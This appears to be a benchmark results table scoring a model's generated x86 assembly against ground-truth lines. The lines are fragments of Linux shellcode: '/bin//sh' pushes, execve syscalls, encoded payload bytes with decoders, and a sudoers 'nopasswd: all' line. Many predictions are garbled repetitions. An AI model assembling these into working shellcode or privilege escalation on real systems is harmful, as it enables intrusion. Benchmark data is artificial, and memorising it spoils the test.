Ground Truth Snippets;Predicted Snippets;Score Semantic Equivalence
mov ax, [esi];mov ax, [esi];1
cmp ecx, 0h;cmp ecx, 0h;1
push 0x6d6f632e \\n push 0x656c676f \\n push 0x6f672031 \\n push 0x2e312e31 \\n push 0x2e373231;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
sub ecx, 0x1525152a;sub ecx, 0x1525152a;1
inc cx;inc cx;1
sys_execve equ 0x0b;0x0b equ 0x0b;0
xor eax, eax \\n xor ebx, ebx;xor eax, eax \\n mul eax;GT: errorGenEXE
sub bl, al;sub al, bl;GT: errorGenEXE
int 0x80;mov al, 0x68732f2f \\n int 0x6e69622f;GT: errorGenEXE
sub bl, 3;sub bl, 3;1
pop esi;mov esi, esp;GT: errorGenEXE
push 0x69622f2f;push 0x69622f2f;1
section .bss;section .;GT: errorGenEXE
xor esi, esi;xor esi, esi;1
mov eax, [y];mov eax, y;GT: errorGenEXE
push edi;push edi;1
cmp dword [eax], ebx;cmp dword [eax], ebx;1
get:;get_label:;GT: errorGenEXE
call_decoder:;call_decoder:;1
decrypt:;decrypt:;1
loop main_push;loop main_push;1
push eax;push eax;1
zerod:;_zerod:;GT: errorGenEXE
mov eax, esp;mov eax, esp;1
mov al, [byte_tbl+2];mov al, byte_tbl+2;GT: errorGenEXE
mov esi, esp;mov esi, esp;1
mov ebx, [y];mov ebx, y;GT: errorGenEXE
duploop:;duploop_label:;GT: errorGenEXE
chmod_call equ 15;=15:;0
shl ebx, 8;shl ebx, 8;1
xor ebx, ebx;ebx:;0
push byte 0x02;push byte 0x02;1
shr dl, 4;shr dl, 4;1
push byte my_label \\n pop eax;push byte my_label \\n pop eax;1
push dword 0x74652f2f \\n mov ebx, esp;push dword 0x74652f2f \\n mov ebx, esp;1
inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi;GT: errorGenEXE
xor edx, edx \\n xor esi, esi;xor edx, edx \\n xor esi, esi;1
xor ah, ah;xor ah, ah;1
jmp loop;jmp loop;1
int 80h;int 0x80;GT: errorGenEXE
F2: \\n not bl \\n inc bl;bl: not bl \\n inc bl \\n inc bl;0
mov [edi], al;mov al, edi;0
push ecx;push ecx;1
push edx;push edx \\n push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x;GT: errorGenEXE
encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;encodedshellcode: db 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87;1
next_addr:;_next_addr:;GT: errorGenEXE
push word 100;push word 100;1
mov esi, eax;mov esi, eax;1
push 0x68732f6e \\n push 0x69622f2f \\n mov ebx, esp;push bin/sh \\n push ebx;0
push eax \\n push edx;push eax \\n push edx;1
inc ax;add ax, 1;GT: errorGenEXE
push 0x65782e2f \\n push 0x706d742f;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
push word 0x462d;push word 0x462d;1
mov ecx, esp;mov ecx, esp;1
lea ecx, [eax];push [\\n pop eax \\n pop ecx;0
sub eax, eax;xor eax, eax;GT: errorGenEXE
xor eax, esi;xor eax, esi;1
jns loopinghere;jns loopinghere;1
inc edx;inc edx;1
mov bl,0x4;mov bl, 0x4;1
duploop:;duploop:;1
pop esi;pop esi;1
push word 0x0a;push af_inet6;GT: errorGenEXE
db 'all all=(all) nopasswd: all', 0xa;db 'all all=(all) nopasswd: all';GT: errorGenEXE
jmp short path;jmp short path;1
mov[esi+39], ebx;pop ebx;GT: errorGenEXE
div ebx;div ebx;1
push ecx;push ecx;1
add edi, edi;add edi, edi;1
zero1a:;_zero1a:;GT: errorGenEXE
cmp edx, 0x43 \\n ja loop \\n push edx;cmp edx, 0x43 \\n jge loop \\n push edx;GT: errorGenEXE
add byte [esi], 0x10;add byte [esi], 0x10;1
section .text;section;GT: errorGenEXE
mov ecx, m_src3;mov ecx, m_src3;1
push word 0x3582;push word 0x68732f2f \\n push word 0x6e69622f \\n push word 0x69622f \\n push word 0x69622f;GT: errorGenEXE
mov byte [esi+14],al;mov byte [esi+14], al;1
next_addr:;next_addr:;1
mov bl, 0x01;mov bl, sys_socket;GT: errorGenEXE
pop esi;pop esi;1
dec ecx \\n jns loop;dec ecx \\n jns loop;1
xor byte [esi+1], dl;xor [esi], dl;GT: errorGenEXE
cmp cl, dl \\n je encodedshellcode;cmp cl, dl \\n je _encodedshellcode;GT: errorGenEXE
encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80 db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80;0
lea ecx, [esp];mov ecx, esp;GT: errorGenEXE
xor eax,eax \\n xor ebx,ebx;xor eax, eax \\n mul eax;GT: errorGenEXE
mov edx, 2;mov edx, 2;1
mov esi, esp;mov esi, esp;1
mov ebx, esp;mov ebx, esp;1
sub eax, [esp];sub eax, esp;GT: errorGenEXE
mov cx, 0x301;mov cx, 0x301;1
hello: db 'hello world!',10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov linefeed, esp;0
cmp cl, 0xff \\n jne dup2;cmp cl, 0xff, \\n jne _dup2;GT: errorGenEXE
inc esi \\n inc esi;inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc esi \\n inc;0
lea ebx, [edx+0x4];lea ebx, [edx+0x4];1
shr dl, 4;shr dl, 4;1
xor eax, 0x6e696230;xor eax, 0x6e696230;1
call [esp];int 0x80;GT: errorGenEXE
mov edi, 0xaaaa9090;mov edi, 0xaaaa9090;1
jb next;inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0 \\n inc var0;0
filecontents: resb 128;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov filecontents, esp;0
mov al, 23;mov al, 23;1
mov edx, eax;xchg edx, eax;GT: errorGenEXE
cmp al, cl \\n jne short decode \\n jmp shellcode;cmp al, cl \\n jne short decode \\n jmp shellcode;1
push dword eax;push dword eax;1
mov bl, 5;push 0x68732f2f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n mov bl, esp;0
pop ecx;pop we;0
push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;push eax \\n push edx \\n push ecx \\n push ebx \\n mov edi, esp;1
mov ecx, esp;mov ecx, esp;1
call write;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
push 10 \\n mov eax, esp;push 10 \\n mov eax, esp;1
xchg ebx, eax;xchg eax, ebx;GT: errorGenEXE
mov ecx, esp;mov ecx, [args];GT: errorGenEXE
mov ecx, esp;mov ecx, esp;1
mov esi, esp;mov esi, esp;1
lea ecx, [esp];mov ebx, esp;GT: errorGenEXE
lea edi, [ebx];lea edi, [ebx];1
xor dl, 0xbb;xor dl, 0xbb;1
mov cl, len;mov cl, 0x68732f2f \\n add cl, 0x68732f \\n add cl, 0x6e69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x69622f \\n add cl, 0x6e69622f \\n add cl, 0x6e69622f \\n add cl, 0x69622f2f \\n add cl, 0x6;GT: errorGenEXE
mov cl, 0x2;mov cl, 0x2;1
mov eax, msg3;mov eax, msg3;1
push 0x78;push 0x78;1
mov al, 11 \\n int 0x80;int 0x80;GT: errorGenEXE
sub bx, dx;sub bx, dx;1
push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;push 0x61702f2f \\n push 0x6374652f \\n mov eax, esp;1
mov edi, hexstr;mov edi, hexstr;1
jmp edi;jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero68732f \\n jmp zero6e69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f \\n jmp zero69622f;GT: errorGenEXE
variablename3: resd 1;push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n push dword for \\n;0
jae _start-0x24;jns _start-0x24;GT: errorGenEXE
push 0x2;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
push eax \\n push 0x68732f2f \\n push 0x6e69622f \\n push ebx, esp \\n mov edx, eax \\n mov al, 0xb \\n int 0x80;push temrinated \\n push '/bin//sh' \\n push ebx \\n push edx \\n push temrinated \\n push '/bin//sh' \\n push ebx \\n mov edx, esp;0
xor ax, bx \\n jz call_decoded;xor ax, bx \\n jz call decoded;0
mov edx, 0x1234567;mov edx, 0x1234567;1
mov [1000h], ax;mov ax, 1000h;GT: errorGenEXE
pop esi;pop esi;1
call_egghunter:;call_egghunter:;1
mov ebx, type var3;mov ebx, var3;GT: errorGenEXE
open:;open_label:;GT: errorGenEXE
mov ecx, esp;mov ecx, esp;1
switch:;_switch:;GT: errorGenEXE
mov byte al, 0xa4;mov al, byte [0xa4];GT: errorGenEXE
2:;numeric 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x69622f;0
push 0xb \\n pop eax;push 0x68732f2f \\n push 0x6e69622f \\n push 0x69622f \\n mov eax, esp;GT: errorGenEXE
mov al, 0xb \\n int 0x80;mov al, 0x68732f2f \\n int 0x68732f \\n int 0x6e69622f \\n int 0x69622f \\n int 0x69622f \\n int 0x6e69622f;GT: errorGenEXE
cmp BYTE al, 2 \\n je do_inject \\n jmp while;cmp al, 2 \\n jne while \\n jmp do_inject;GT: errorGenEXE
pop ebx;pop ebx;1
push 0x10;push 0x68732f \\n push 0x68732f \\n push 0x6e69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f \\n push 0x69622f;GT: errorGenEXE
push byte 49;push byte 49;1
mov al, 0x58;push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n push ebx \\n mov ebx, esp;GT: errorGenEXE
xor eax, eax \\n push eax;push edx;GT: errorGenEXE
cmp eax, ebx \\n je child;cmp eax, ebx \\n jne child;GT: errorGenEXE
mov ax, 8h;mov ax, 8h;1
push 0x2f2f2f2f \\n mov ecx, esp;push 0x2f2f2f2f \\n mov ecx, esp;1
"call shellcode \\n message db ""/bin/sh""";push of /bin/sh \\n push eip \\n mov shellcode_label, esp;0
cmp bl, 0x1f;cmp bl, 0x1f;1
